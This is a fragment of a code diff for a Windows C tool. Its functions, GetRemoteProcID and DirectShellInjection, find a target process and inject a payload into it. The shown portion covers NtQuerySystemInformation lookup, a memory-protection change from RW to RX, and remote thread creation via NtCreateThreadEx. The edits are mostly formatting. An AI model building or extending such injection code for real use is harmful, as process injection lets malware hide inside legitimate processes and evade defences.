@@ -10,11 +10,12 @@ BOOL GetRemoteProcID
 
 {
 
-	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
-	ULONG							uReturnLen1 = 0, uReturnLen2 = 0;
-	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
-	PVOID							pValueToFree = NULL;
-	NTSTATUS						STATUS = 0;
+	fnNtQuerySystemInformation		pNtQuerySystemInformation	= NULL;
+	ULONG							uReturnLen1					= 0, 
+									uReturnLen2					= 0;
+	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo				= NULL;
+	PVOID							pValueToFree				= NULL;
+	NTSTATUS						STATUS						= 0;
 
 
 	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
@@ -103,7 +104,7 @@ BOOL DirectShellInjection(
 	HANDLE		  hProcess = NULL;
 	HANDLE		   hThread = NULL;
 	PVOID		   rBuffer = NULL;
-	DWORD			   TID = NULL;
+	DWORD			   TID = 0;
 	BOOL             State = TRUE;
 	HMODULE    NtdllHandle = NULL;
 	DWORD       OldProtection = 0;
@@ -168,6 +169,8 @@ BOOL DirectShellInjection(
 	}
 
 	OKAY("Changed Allocation Protection from [RW] to [RX]");
+
+	// Create Thread Pointing to Our Payload
 
 	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
 	if (STATUS_SUCCESS != STATUS)
